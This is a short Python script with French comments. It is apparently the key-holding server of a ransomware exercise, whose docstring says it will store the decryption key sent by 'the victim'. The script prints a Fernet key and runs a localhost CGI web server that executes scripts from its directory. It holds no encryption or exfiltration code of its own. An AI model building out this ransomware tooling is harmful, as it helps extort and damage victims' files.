import http.server
import requests
import threading
from cryptography.fernet import Fernet


def generate_key():
    """
    Generates a 128-bit AES key for encrypting files. Sets self.cyptor with a Fernet object
    """

    key = Fernet.generate_key()
    #cryptor = Fernet(key)
    print(key)



"""
Le serveur hébergera la clé de déchiffrement envoyé par la victime.
"""
generate_key()
port = 8080
server_address = ("127.0.0.1", port) #Création d'un serveur web en localhost
server = http.server.HTTPServer
handler = http.server.CGIHTTPRequestHandler
handler.cgi_directories = ["./"]
print("Serveur actif sur le port :", port)
httpd = server(server_address, handler)
httpd.serve_forever()

